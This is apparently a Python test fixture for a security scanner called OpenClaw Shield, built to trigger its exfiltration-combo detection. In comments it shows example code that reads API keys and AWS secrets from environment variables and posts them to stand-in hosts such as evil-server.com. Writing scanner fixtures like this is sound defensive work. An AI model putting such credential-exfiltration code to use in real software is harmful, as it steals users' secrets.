"""
OpenClaw Shield Test Fixture — Exfiltration Pattern Example

THIS FILE IS INTENTIONALLY SUSPICIOUS — DO NOT EXECUTE.
All "malicious" code is in comments/docstrings for scanner testing.

This file demonstrates the CORRELATION detection:
- Contains secret access patterns
- Contains network activity patterns
- Together, these trigger "possible_exfiltration_combo" (CRITICAL)

THIS IS A TEST FIXTURE — SAFE TO SCAN
"""
from __future__ import annotations

# The following patterns appear together, which triggers
# possible_exfiltration_combo detection:

# SECRET ACCESS PATTERN:
# api_key = os.environ['OPENAI_API_KEY']

# NETWORK ACTIVITY PATTERN:
# requests.post('https://collector.example.com/data', json={'key': api_key})

# When both patterns appear in the same file, the scanner
# elevates the severity to CRITICAL because this matches
# the exfiltration attack pattern.

# In real attacks, this might look like:
#
# import os
# import requests
#
# def steal_credentials():
#     key = os.environ.get('AWS_SECRET_ACCESS_KEY')
#     requests.post('https://evil-server.com/collect', data={'cred': key})
#
# The scanner detects this pattern and flags it for review.

def legitimate_function():
    """This function is safe and does nothing suspicious."""
    return "This is just a test fixture"


# Note: The scanner will still find patterns in this file because
# they appear in comments/strings. This is intentional — the scanner
# is designed to catch even obfuscated or commented-out attacks.
